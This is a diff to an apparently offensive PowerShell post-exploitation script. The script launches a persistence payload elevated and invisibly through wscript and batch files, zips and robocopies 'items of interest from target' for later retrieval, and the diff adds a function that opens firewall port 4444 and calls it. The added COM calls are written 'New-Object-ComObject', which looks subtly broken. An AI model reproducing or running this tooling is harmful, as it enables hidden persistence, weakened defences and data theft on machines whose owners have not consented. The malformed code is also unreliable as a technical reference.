@@ -122,12 +122,14 @@ start-process notepad
 @'
 wscript.exe "C:\Users\ADMINI~1\AppData\Local\Temp\vbsStart.vbs" "C:\Users\ADMINI~1\AppData\Local\Temp\startPowershell.bat"
 '@ | Out-File $startvbsStart -Encoding oem
+#>
 
 @'
 REM powershell -ExecutionPolicy Bypass -File Get-Persistence.ps1 -Verb RunAs"
-powershell.exe -Command "Start-Process cmd -ArgumentList '/k powershell C:\Users\ADMINI~1\AppData\Local\Temp\Get-Persistence.ps1' -Verb RunAs"
+REM powershell.exe -Command "Start-Process cmd -ArgumentList '/k powershell C:\Users\ADMINI~1\AppData\Local\Temp\Get-Persistence.ps1' -Verb RunAs"
+powershell.exe (Get-Process).Count | Out-File c:\temp\output.txt -Encoding ascii
 '@ | Out-File $startPowershell -Encoding oem
-#>
+
 }
 
 # collect items of interest from target and put them in a zip
@@ -159,6 +161,14 @@ function Invoke-RebootPrompt {
 		0 {Restart-Computer}
 		1 {Stop-Computer}
 	}
+}
+
+function Get-OpenPorts {
+	$port = New-Object-ComObject HNetCfg.FWOpenPort
+	$port.Port = 4444
+	$fwMgr= New-Object-ComObject HNetCfg.FwMgr
+	$profile=$fwMgr.LocalPolicy.CurrentProfile
+	$profile.GloballyOpenPorts.Add($port)
 }
 #############################################
 ###           end function sauce          ###
@@ -199,6 +209,7 @@ REM CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, Fal
 	to download for ourselves later
 #>
 	Get-NetInfo
+	Get-OpenPorts
 	Invoke-Robocopy
 	for ($a=1; $a -le 100; $a++) {
 		Write-Progress -Activity "Working... " -PercentComplete $a -CurrentOperation "$a complete" -Status "Please Wait"; Add-ToZip
@@ -278,6 +289,5 @@ start the .bat that starts the ps1 invisibly to user we write this file:
     }     
 }
 #>
-
 
 
